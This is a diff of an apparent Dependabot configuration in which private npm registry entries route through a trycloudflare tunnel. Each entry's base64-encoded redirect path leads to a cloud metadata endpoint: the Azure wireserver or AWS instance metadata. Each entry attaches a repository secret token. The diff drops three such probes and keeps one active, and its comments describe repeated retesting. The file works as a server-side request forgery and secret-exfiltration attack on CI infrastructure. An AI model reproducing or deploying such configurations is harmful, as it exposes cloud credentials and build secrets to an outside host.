@@ -5,24 +5,9 @@ registries:
     url: https://trucks-commitments-neck-wal.trycloudflare.com/redir/302/aHR0cDovLzE2OC42My4xMjkuMTYvP2NvbXA9dmVyc2lvbnM
     token: ${{secrets.SINK1_TOKEN}}
     replaces-base: true
-  p_vms:
-    type: npm-registry
-    url: https://trucks-commitments-neck-wal.trycloudflare.com/redir/302/aHR0cDovLzE2OC42My4xMjkuMTY6MzI1MjYvdm1TZXR0aW5ncw
-    token: ${{secrets.SINK1_TOKEN}}
-    replaces-base: true
-  p_443:
-    type: npm-registry
-    url: https://trucks-commitments-neck-wal.trycloudflare.com/redir/302/aHR0cHM6Ly8xNjguNjMuMTI5LjE2Lw
-    token: ${{secrets.SINK1_TOKEN}}
-    replaces-base: true
-  p_imds:
-    type: npm-registry
-    url: https://trucks-commitments-neck-wal.trycloudflare.com/redir/302/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw
-    token: ${{secrets.SINK1_TOKEN}}
-    replaces-base: true
 updates:
   - package-ecosystem: "npm"
     directory: "/"
     schedule: {interval: "daily"}
     registries: "*"
-# port retest matrix 202826Z
+# solo p_ver 203129Z
